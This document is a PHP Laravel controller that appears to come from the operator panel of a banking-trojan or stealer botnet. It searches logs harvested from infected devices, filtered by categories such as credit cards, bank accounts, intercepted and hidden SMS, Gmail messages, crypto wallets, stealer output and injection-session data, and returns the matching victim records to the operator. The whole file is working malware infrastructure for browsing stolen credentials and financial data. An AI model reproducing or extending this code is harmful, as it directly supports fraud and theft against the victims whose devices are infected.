<?php

namespace App\Http\Controllers\Api\v1;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Models\BotLog;
use App\Models\InjectionSession;
use App\Services\LogsService\LogsService;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Illuminate\Validation\ValidationException;

class SearchController extends Controller
{
    /**
     * @throws ValidationException
     */
    public function index(Request $request): ApiResponse
    {
        $allowedTypes = [
            "credit_cards",
            "banks",
            "otheraccounts",
            "smslist",
            "hidesms",
            "gmail_mes",
            "crypt",
            "stealers",
            "emails",
            "wallets",
            "shops",
            "smart_injections",
        ];

        $this->validate($request, [
            "query" => "string|required|min:4",
            "types" => [
                "array",
                Rule::in($allowedTypes),
            ],
        ]);

        $types = !empty($request->get("types")) ? $request->get("types") : $allowedTypes;

        $logs = BotLog::whereIn("type", $types)
            ->where("log", "LIKE", "%{$request->get("query")}%")
            ->with("bot")
            ->get()
            ->map(function (BotLog $log) {
                $log->log = collect(LogsService::getArrayLog($log->log));
                return $log;
            })
            ->groupBy("type");

        if (in_array("smart_injections", $types)) {
            $smartInjections = InjectionSession::where("data", "LIKE", "%{$request->get("query")}%")
                ->get()
                ->map(function (InjectionSession $smartInjection) {
                    return (new BotLog)->fill([
                        "id" => $smartInjection->id,
                        "bot_id" => $smartInjection->bot_id,
                        "application" => $smartInjection->application,
                        "log" => $smartInjection->data,
                        "created_at" => $smartInjection->created_at,
                        "updated_at" => $smartInjection->updated_at,
                    ]);
                });

            if (count($smartInjections)) {
                $logs["smart_injections"] = $smartInjections;
            }
        }

        return ApiResponse::success($logs);
    }
}
